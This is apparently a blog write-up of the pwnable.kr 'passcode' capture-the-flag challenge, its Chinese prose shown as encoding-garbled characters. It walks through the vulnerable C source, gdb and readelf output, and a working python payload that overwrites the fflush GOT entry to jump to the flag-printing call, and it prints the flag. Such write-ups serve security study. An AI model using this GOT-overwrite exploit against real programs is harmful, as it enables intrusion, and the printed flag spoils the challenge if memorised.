---
id: 45
title: pwnable.kr-passcode
date: 2016-07-15T09:13:34+00:00
author: admin
layout: post
guid: http://www.ikow.cn/?p=45
permalink: /pwnable-kr-passcode/
categories:
  - pwn
tags:
  - canary
  - exploit
  - gdb
  - GOTè¦†ç›–
  - peda
  - pwn
  - pwnable.kr
  - shellcode
  - æº¢å‡º
---
ä¾ç„¶æ˜¯é¢˜ç›®æè¿°ï¼š

> Mommy told me to make a passcode based login system.
  
> My initial C code was compiled without any error!
  
> Well, there was some compiler warning, but who cares about that?
> 
> ssh passcode@pwnable.kr -p2222 (pw:guest)

è¿ä¸Šåï¼Œç›®å½•ä¸‹æœ‰cæºç å’Œå¯æ‰§è¡Œæ–‡ä»¶ï¼Œ

é¦–å…ˆæŸ¥çœ‹ä¸‹ç¨‹åºå¼€äº†é‚£äº›é˜²æŠ¤æªæ–½ï¼š

> gdb-peda$ checksec
  
> CANARY : ENABLED
  
> FORTIFY : disabled
  
> NX : ENABLED
  
> PIE : disabled
  
> RELRO : Partial

è¿™é‡Œå¼€å¯äº†canaryï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½å¤Ÿåˆ©ç”¨ä¸€æ¬¡ä»»æ„å†…å­˜å†™çš„åŠŸèƒ½ï¼Œæ— æ³•é€šè¿‡å†™å…¥shellcode å†åˆ°è·³è½¬åˆ°shellcodeçš„åœ°å€æ¥exploitï¼ˆè‡³å°‘å†™æ–‡ç« çš„æ—¶å€™æˆ‘è¿˜ä¸ä¼šå…¶ä»–æ–¹æ³•ï¼‰ï¼ŒåŒæ ·çš„æˆ‘ä»¬åœ¨åæ±‡ç¼–çš„ä»£ç ä¸­ä¹Ÿå¯ä»¥çœ‹å‡ºæ¥é‡‡ç”¨äº†canaryï¼š

gdb-peda$ disas welcome
  
Dump of assembler code for function welcome:
   
0x08048609 <+0>: push ebp
   
0x0804860a <+1>: mov ebp,esp
   
0x0804860c <+3>: sub esp,0x88
   
0x08048612 <+9>: mov eax,gs:0x14
   
0x08048618 <+15>: mov DWORD PTR [ebp-0xc],eax
   
0x0804861b <+18>: xor eax,eax
   
0x0804861d <+20>: mov eax,0x80487cb
   
0x08048622 <+25>: mov DWORD PTR [esp],eax
   
0x08048625 <+28>: call 0x8048420 <printf@plt>
   
0x0804862a <+33>: mov eax,0x80487dd
   
0x0804862f <+38>: lea edx,[ebp-0x70]
   
0x08048632 <+41>: mov DWORD PTR [esp+0x4],edx
   
0x08048636 <+45>: mov DWORD PTR [esp],eax
   
0x08048639 <+48>: call 0x80484a0 <_\_isoc99\_scanf@plt>
   
0x0804863e <+53>: mov eax,0x80487e3
   
0x08048643 <+58>: lea edx,[ebp-0x70]
   
0x08048646 <+61>: mov DWORD PTR [esp+0x4],edx
   
0x0804864a <+65>: mov DWORD PTR [esp],eax
   
0x0804864d <+68>: call 0x8048420 <printf@plt>
   
0x08048652 <+73>: mov eax,DWORD PTR [ebp-0xc]
   
0x08048655 <+76>: xor eax,DWORD PTR gs:0x14
   
0x0804865c <+83>: je 0x8048663 <welcome+90>
   
0x0804865e <+85>: call 0x8048440 <_\_stack\_chk_fail@plt>
   
0x08048663 <+90>: leave
   
0x08048664 <+91>: ret
  
End of assembler dump.

å¼€å§‹çš„æ—¶å€™æœ‰ä¸ªmov eax, gs:0x14ï¼Œç»“å°¾çš„æ—¶å€™æœ‰ä¸ªxor eax,gs:0x14ï¼Œé€šè¿‡å­˜å‚¨å‡½æ•°è¿è¡Œå‰åå †æ ˆçš„çŠ¶æ€æ¥åˆ¤æ–­æ˜¯å¦æœ‰æ ˆæº¢å‡ºï¼Œä»è€Œè¿›è¡Œä¿æŠ¤ã€‚è¿™é‡Œå¦‚æœæˆ‘ä»¬è¦è¿›è¡Œåˆ©ç”¨ï¼Œåªèƒ½åœ¨ç»“æŸçš„æ£€æµ‹ä¹‹å‰åˆ©ç”¨å®Œæˆï¼Œæˆ–è€…åœ¨æ£€æµ‹ä¸­åªæ˜¯è¿›è¡Œæ„é€ åˆ©ç”¨ä»£ç ï¼Œä¸å½±å“æ ˆçš„çŠ¶æ€ï¼Œç„¶ååœ¨éšåçš„ç¨‹åºä¸­è¿›è¡Œåˆ©ç”¨ã€‚

æºç ä¸ºï¼š

<pre class="brush: cpp; title: ; notranslate" title="">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void login(){
 int passcode1;
 int passcode2;

 printf("enter passcode1 : ");
 scanf("%d", passcode1);
 fflush(stdin);

 // ha! mommy told me that 32bit is vulnerable to bruteforcing ğŸ™‚
 printf("enter passcode2 : ");
 scanf("%d", passcode2);

 printf("checking...\n");
 if(passcode1==338150 && passcode2==13371337){
 printf("Login OK!\n");
 system("/bin/cat flag");
 }
 else{
 printf("Login Failed!\n");
 exit(0);
 }
}

void welcome(){
 char name[100];
 printf("enter you name : ");
 scanf("%100s", name);
 printf("Welcome %s!\n", name);
}

int main(){
 printf("Toddler's Secure Login System 1.0 beta.\n");

 welcome();
 login();

 // something after login...
 printf("Now I can safely trust you that you have credential :)\n");
 return 0; 
}
</pre>

æˆ‘ä»¬å¯ä»¥çœ‹åˆ°scanfæ¥å—çš„å‚æ•°å†™é”™äº†ï¼Œæ²¡æœ‰åŠ å–åœ°å€ç¬¦å·ï¼Œè¿™æ ·å°±ä¼šæŠŠå‚æ•°ä¸­çš„æ•°å€¼ä½œä¸ºåœ°å€è¿›è¡Œå†™å…¥äº†ï¼Œç°åœ¨çš„é—®é¢˜æ˜¯æˆ‘ä»¬å¦‚ä½•æ¥æ§åˆ¶passcode1çš„å†…å®¹å‘¢ï¼Ÿæˆ‘ä»¬ç”¨gdbå¯¹ç¨‹åºè¿›è¡Œè°ƒè¯•ï¼š

> gdb-peda$ r
  
> Starting program: /root/Desktop/passcode
  
> Toddler&#8217;s Secure Login System 1.0 beta.
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-registers&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;]
  
> EAX: 0x28 (&#8216;(&#8216;)
  
> EBX: 0x0
  
> ECX: 0xf7fd3028 &#8211;> 0x0
  
> EDX: 0xf7fb0870 &#8211;> 0x0
  
> ESI: 0x1
  
> EDI: 0xf7faf000 &#8211;> 0x1b3db0
  
> EBP: 0xffffd888 &#8211;> 0xffffd8a8 &#8211;> 0x0
  
> ESP: 0xffffd800 &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> EIP: 0x8048612 (<welcome+9>: mov eax,gs:0x14)
  
> EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-code&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-]
  
> 0x8048609 <welcome>: push ebp
  
> 0x804860a <welcome+1>: mov ebp,esp
  
> 0x804860c <welcome+3>: sub esp,0x88
  
> => 0x8048612 <welcome+9>: mov eax,gs:0x14
  
> 0x8048618 <welcome+15>: mov DWORD PTR [ebp-0xc],eax
  
> 0x804861b <welcome+18>: xor eax,eax
  
> 0x804861d <welcome+20>: mov eax,0x80487cb
  
> 0x8048622 <welcome+25>: mov DWORD PTR [esp],eax
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;stack&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-]
  
> 0000| 0xffffd800 &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> 0004| 0xffffd804 &#8211;> 0x27 (&#8220;&#8216;&#8221;)
  
> 0008| 0xffffd808 &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> 0012| 0xffffd80c &#8211;> 0xf7e6734b (<\_IO\_file_overflow+219>: add esp,0x10)
  
> 0016| 0xffffd810 &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> 0020| 0xffffd814 &#8211;> 0xf7fd3000 (&#8220;Toddler&#8217;s Secure Login System 1.0 beta.\n&#8221;)
  
> 0024| 0xffffd818 &#8211;> 0x28 (&#8216;(&#8216;)
  
> 0028| 0xffffd81c &#8211;> 0xf7e6727c (<\_IO\_file_overflow+12>: add edx,0x147d84)
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;]
  
> Legend: code, data, rodata, value
> 
> Breakpoint 1, 0x08048612 in welcome ()

å½“æˆ‘ä»¬æ–­ç‚¹åœ¨welcomeå‡½æ•°ä¸­æ—¶ï¼Œebpçš„å†…å®¹ä¸ºï¼š0xffffd888

> gdb-peda$ c
  
> Continuing.
  
> enter you name : aaaaa
  
> Welcome aaaaa!
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-registers&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8211;]
  
> EAX: 0x0
  
> EBX: 0x0
  
> ECX: 0x7ffffff2
  
> EDX: 0xf7fb0870 &#8211;> 0x0
  
> ESI: 0x1
  
> EDI: 0xf7faf000 &#8211;> 0x1b3db0
  
> EBP: 0xffffd888 &#8211;> 0xffffd8a8 &#8211;> 0x0
  
> ESP: 0xffffd860 &#8211;> 0xf7fe83cb (add ebp,0x14c35)
  
> EIP: 0x804856a (<login+6>: mov eax,0x8048770)
  
> EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-code&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-]
  
> 0x8048564 <login>: push ebp
  
> 0x8048565 <login+1>: mov ebp,esp
  
> 0x8048567 <login+3>: sub esp,0x28
  
> => 0x804856a <login+6>: mov eax,0x8048770
  
> 0x804856f <login+11>: mov DWORD PTR [esp],eax
  
> 0x8048572 <login+14>: call 0x8048420 <printf@plt>
  
> 0x8048577 <login+19>: mov eax,0x8048783
  
> 0x804857c <login+24>: mov edx,DWORD PTR [ebp-0x10]
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;stack&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;-]
  
> 0000| 0xffffd860 &#8211;> 0xf7fe83cb (add ebp,0x14c35)
  
> 0004| 0xffffd864 &#8211;> 0xf7dfa700 (0xf7dfa700)
  
> 0008| 0xffffd868 &#8211;> 0x0
  
> 0012| 0xffffd86c &#8211;> 0xf7fafd60 &#8211;> 0xfbad2a84
  
> 0016| 0xffffd870 &#8211;> 0xffffd8a8 &#8211;> 0x0
  
> 0020| 0xffffd874 &#8211;> 0xf7feec80 (pop edx)
  
> 0024| 0xffffd878 &#8211;> 0xf7e5cbeb (<puts+11>: add ebx,0x152415)
  
> 0028| 0xffffd87c &#8211;> 0xfb14c000
  
> [&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;&#8212;]
  
> Legend: code, data, rodata, value
> 
> Breakpoint 2, 0x0804856a in login ()

å½“æˆ‘ä»¬æ–­åœ¨loginå‡½æ•°ä¸­æ—¶ï¼Œå‘ç°ebpçš„å†…å®¹ä¹Ÿä¸ºï¼š0xffffd888ã€‚

åœ¨idaä¸­æˆ‘ä»¬å‘ç°ï¼Œnameçš„åœ°å€ä¸ºï¼š[ebp-70h] passcode1çš„åœ°å€ä¸º[ebp-10h]ï¼Œä¸¤ä¸ªåœ°å€åœ¨åŒä¸€ä¸ªå †æ ˆä¸­ï¼Œè€Œä¸”ç›¸å·®ä¸º70h-10h=60h=96ï¼Œè€Œnameçš„å¤§å°ä¸º100ä¸ªå­—èŠ‚ï¼Œé‚£ä¹ˆæ­£å¥½æˆ‘ä»¬å¯ä»¥é€šè¿‡nameçš„åå››ä¸ªå­—èŠ‚æ¥è¦†ç›–passcode1çš„å†…å®¹ã€‚

æ¥ä¸‹æ¥å¦‚ä½•åˆ©ç”¨å†™å…¥passcode1çš„åœ°å€æ¥æ§åˆ¶eipè·³è½¬åˆ°æ‰§è¡Œcat flagçš„åœ°æ–¹ï¼Œæˆ–è€…æ˜¯è·³è½¬åˆ°æˆ‘ä»¬çš„shellcodeå‘¢ï¼Ÿ

è¿™é‡Œä½¿ç”¨äº†GOTè¦†ç›–æŠ€æœ¯ï¼ŒGOTè¦†ç›–å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªç¨‹åºä¸­è°ƒç”¨å‡½æ•°çš„è¡¨ï¼Œæˆ‘ä»¬åˆ©ç”¨nameçš„åå››ä¸ªå­—èŠ‚æ§åˆ¶äº†scanfå†™å…¥å†…å®¹çš„åœ°å€ï¼Œç„¶åé€šè¿‡scanfæ”¹å†™GOTè¡¨ï¼Œä½¿eipè·³è½¬åˆ°æˆ‘ä»¬åˆ¶å®šçš„åœ°æ–¹ï¼Œæˆ‘ä»¬çœ‹ä¸‹ç¨‹åºä¸­è°ƒç”¨systemçš„åœ°å€ï¼š

> 0x080485e3 <+127>: mov DWORD PTR [esp],0x80487af
  
> 0x080485ea <+134>: call 0x8048460 <system@plt>

å¯ä»¥çœ‹åˆ°åœ°å€ä¸º0x080485e3 è¿™ä¸ªåœ°å€æ˜¯æˆ‘ä»¬éœ€è¦å°†GOTè¡¨ä¸­å†…å®¹è¦†ç›–çš„åœ°å€ï¼Œæ¢æˆ10è¿›åˆ¶å°±æ˜¯ï¼š134514147ï¼Œæˆ‘ä»¬å†çœ‹ä¸‹passcodeçš„GOTè¡¨ï¼š

> âœ Desktop readelf -r passcode
> 
> Relocation section &#8216;.rel.dyn&#8217; at offset 0x388 contains 2 entries:
  
> Offset Info Type Sym.Value Sym. Name
  
> 08049ff0 00000606 R\_386\_GLOB\_DAT 00000000 \\_\_gmon\_start\\_\_
  
> 0804a02c 00000b05 R\_386\_COPY 0804a02c stdin@GLIBC_2.0
> 
> Relocation section &#8216;.rel.plt&#8217; at offset 0x398 contains 9 entries:
  
> Offset Info Type Sym.Value Sym. Name
  
> 0804a000 00000107 R\_386\_JUMP\_SLOT 00000000 printf@GLIBC\_2.0
  
> 0804a004 00000207 R\_386\_JUMP\_SLOT 00000000 fflush@GLIBC\_2.0
  
> 0804a008 00000307 R\_386\_JUMP\_SLOT 00000000 \_\_stack\_chk\_fail@GLIBC\_2.4
  
> 0804a00c 00000407 R\_386\_JUMP\_SLOT 00000000 puts@GLIBC\_2.0
  
> 0804a010 00000507 R\_386\_JUMP\_SLOT 00000000 system@GLIBC\_2.0
  
> 0804a014 00000607 R\_386\_JUMP\_SLOT 00000000 \\_\_gmon\_start\\_\_
  
> 0804a018 00000707 R\_386\_JUMP\_SLOT 00000000 exit@GLIBC\_2.0
  
> 0804a01c 00000807 R\_386\_JUMP\_SLOT 00000000 \_\_libc\_start\_main@GLIBC\_2.0
  
> 0804a020 00000907 R\_386\_JUMP\_SLOT 00000000 \_\_isoc99\_scanf@GLIBC_2.7

æˆ‘ä»¬çœ‹åˆ°åœ¨systemå’Œprintf passcode1ä¹‹é—´è°ƒç”¨äº†printf fflushï¼Œæ‰€ä»¥è¿™äº›å‡½æ•°åœ¨GOTä¸­çš„åœ°å€æˆ‘ä»¬éƒ½å¯ä»¥åˆ©ç”¨ï¼Œè¿™é‡Œé€‰æ‹©fflushçš„åœ°å€0x0804a004ï¼Œè¿™ä¸ªåœ°å€æ˜¯éœ€è¦åˆ©ç”¨nameçš„åå››ä½è¿›è¡Œè¦†ç›–çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆçš„payloadä¸ºï¼š

> passcode@ubuntu:~$ python -c &#8220;print(&#8216;a&#8217;*96+&#8217;\x04\xa0\x04\x08\n&#8217;+&#8217;134514147\n&#8217;)&#8221; | ./passcode
  
> Toddler&#8217;s Secure Login System 1.0 beta.
  
> enter you name : Welcome aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaï¿½!
  
> Sorry mom.. I got confused about scanf usage ğŸ™
  
> enter passcode1 : Now I can safely trust you that you have credential ğŸ™‚

æ‰€ä»¥flagä¸ºï¼š

Sorry mom.. I got confused about scanf usage ğŸ™